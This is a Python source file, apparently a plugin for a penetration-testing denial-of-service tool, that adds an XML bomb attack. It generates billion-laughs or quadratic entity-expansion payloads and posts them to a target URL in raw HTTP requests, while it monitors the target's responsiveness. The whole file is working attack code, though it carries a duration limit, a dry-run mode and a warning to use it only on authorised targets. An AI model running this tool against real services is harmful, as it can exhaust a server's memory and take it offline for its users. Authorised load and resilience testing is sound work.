"""ptdos extension that adds an XML bomb attack."""
# python3 ptdos.py -a xmlbomb -dst "http://target.local/xml" -xf billion_laughs

# own libs
from monitoring.ptcheckservice import attack_append_out_data, attack_checkservice_review, print_error
from infrastructure import factory
from misc.pt_socket import create_socket
from misc import pt_xml
# external libs
from dataclasses import dataclass
from time import time, sleep, asctime
from ptlibs.ptprinthelper import out_ifnot,ptprint
from urllib.parse import urlparse
from socket import error, timeout as socket_timeout

# Soft limit for the estimated expanded payload. Above this we warn the user,
# because an accidental over-sized bomb can take down the *operator's* machine
# while building/holding the string, not just the target.
EXPANSION_WARN_BYTES = 10 * 1024 * 1024 * 1024  # 10 GB


def build_post_request(hostname: str, path: str, query: str, body_bytes: bytes) -> bytes:
    """Build a raw HTTP/1.1 POST request carrying an XML body."""
    uri = f"{path}?{query}" if query else (path or "/")
    head = (
        f"POST {uri} HTTP/1.1\r\n"
        f"Host: {hostname}\r\n"
        f"User-Agent: ptdos-xmlbomb\r\n"
        f"Accept: */*\r\n"
        f"Content-Type: application/xml\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        f"Connection: close\r\n\r\n"
    )
    return head.encode("UTF-8") + body_bytes


@dataclass
class XmlBomb:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        xml_format = args["xmlformat"]
        depth = args["xmlentities"]
        width = args["xmlwidth"]
        base_size = args["xmlbase"]
        count = args["xmlcount"]
        requests_to_send = args["xmlrequests"]
        output_file = args["outputfile"]
        no_send = args["nosend"]
        sleeptime = args["sleeptime"]

        try:
            estimated = pt_xml.estimate_expanded_size(xml_format, depth, width, base_size, count)
            payload = pt_xml.build_payload(xml_format, depth, width, base_size, count)
        except ValueError as err:
            return print_error(json_obj, use_json, json_no, self.name, str(err))

        payload_bytes = payload.encode("UTF-8")

        ptprint(out_ifnot(f"XML bomb technique: {xml_format}", "INFO", use_json))
        ptprint(out_ifnot(
            f"Transmitted size: {pt_xml.human_size(len(payload_bytes))}, "
            f"estimated expanded size: {pt_xml.human_size(estimated)}",
            "INFO", use_json))

        if estimated > EXPANSION_WARN_BYTES:
            ptprint(out_ifnot(
                f"Estimated expansion {pt_xml.human_size(estimated)} exceeds the "
                f"{pt_xml.human_size(EXPANSION_WARN_BYTES)} soft limit - this can also "
                f"overwhelm vulnerable intermediaries. Proceed only on an authorised target.",
                "WARNING", use_json))

        if output_file:
            try:
                with open(output_file, "w", encoding="UTF-8") as fh:
                    fh.write(payload)
                ptprint(out_ifnot(f"Payload written to {output_file}", "INFO", use_json))
            except OSError as err:
                return print_error(json_obj, use_json, json_no, self.name, f"Cannot write payload: {err}")

        if no_send:
            ptprint(out_ifnot("Dry run (-ns): payload generated, nothing sent.", "INFO", use_json))
            return

        url = urlparse(dst)
        port = url.port or args["dstport"]
        request = build_post_request(url.hostname, url.path, url.query, payload_bytes)

        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        sent = 0
        try:
            while sent < requests_to_send:
                # respect overall duration as a safety stop
                if time() - att_start_t_epoch >= duration:
                    ptprint(out_ifnot("Duration limit reached, stopping.", "INFO", use_json))
                    break

                try:
                    sock = create_socket(self.name)
                    sock.settimeout(10)
                    sock.connect((url.hostname, port))
                    sock.sendall(request)
                    sent += 1
                    ptprint(out_ifnot(f"XML bomb POST #{sent} sent ({pt_xml.human_size(len(payload_bytes))}).", "INFO", use_json))

                    
                    try:
                        resp = sock.recv(256)
                        if resp:
                            status = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                            ptprint(out_ifnot(f"Response: {status}", "INFO", use_json))
                    except socket_timeout:
                        ptprint(out_ifnot("No response within timeout (possible parser stall).", "INFO", use_json))
                    sock.close()

                except (error, OSError) as serr:
                    ptprint(out_ifnot(f"Connection problem: {serr}", "ERROR", use_json))

                if sent < requests_to_send:
                    sleep(sleeptime)

            monitoringprocess()  # stop checkservice end monitoring
            att_end_t_asc = asctime()
            sleep(1)  # let the monitoring process settle

            # The attack itself is already done at this point. Reviewing the
            # CheckService samples can fail when none were captured - e.g. a
            # single fast request over loopback, where the baseline is skipped
            # too - and that must not be reported as an attack failure.
            try:
                attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                attack_append_out_data(use_json, json_obj, json_no, self.name, duration,
                                       att_start_t_asc, att_end_t_asc, url.hostname, count=sent, dstport=port)
                monitoring.checkservice_append_out_data(json_obj, use_json, json_no)
            except (ZeroDivisionError, AttributeError):
                ptprint(out_ifnot(
                    f"Payload delivered ({sent} request(s)). CheckService captured no samples "
                    f"(short run / loopback), skipping latency review.", "INFO", use_json))
            return

        except BaseException as err:
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0] if err.args else str(err))

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"XML bomb attack options": [
                ["-a", "--attack", "<attack>", "Attack name - xmlbomb"],
                ["-dst", "--destination", "<dst>", 'Target endpoint, e.g. "http://domain.com/xml".'],
                ["-dp", "--dstport", "<dstport>", "Destination port. Default 80."],
                ["-d", "--duration", "<duration>", "Max attack duration in seconds (safety stop). Default 10."],
                ["-xf", "--xml-format", "<format>", "Bomb technique: billion_laughs (recursive) or quadratic (flat). Default billion_laughs."],
                ["-xe", "--xml-entities", "<depth>", "billion_laughs: number of nested entity levels. Default 9."],
                ["-xw", "--xml-width", "<width>", "billion_laughs: references per level (expansion factor). Default 10."],
                ["-xc", "--xml-count", "<count>", "quadratic: number of top-level entity references. Default 50000."],
                ["-xb", "--xml-base", "<bytes>", "Size of the base string block in bytes. Default 100."],
                ["-xr", "--xml-requests", "<n>", "Number of POST requests to send. Default 1."],
                ["-of", "--output-file", "<path>", "Also write the generated payload to this file."],
                ["-ns", "--no-send", "", "Generate (and optionally save) the payload only, do not deliver it."],
                ["-st", "--sleep-time", "<sleeptime>", "Seconds between requests. Default 0."],
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""
        parser.add_argument("-xf", "--xml-format", dest="xmlformat", type=str,
                            choices=["billion_laughs", "quadratic"], default="billion_laughs")
        parser.add_argument("-xe", "--xml-entities", dest="xmlentities", type=int, default=9)
        parser.add_argument("-xw", "--xml-width", dest="xmlwidth", type=int, default=10)
        parser.add_argument("-xc", "--xml-count", dest="xmlcount", type=int, default=50000)
        parser.add_argument("-xb", "--xml-base", dest="xmlbase", type=int, default=100)
        parser.add_argument("-xr", "--xml-requests", dest="xmlrequests", type=int, default=1)
        parser.add_argument("-of", "--output-file", dest="outputfile", type=str, default="")
        parser.add_argument("-ns", "--no-send", dest="nosend", action="store_true", default=False)


def register() -> None:
    """Register attack in factory."""
    factory.register("xmlbomb", XmlBomb)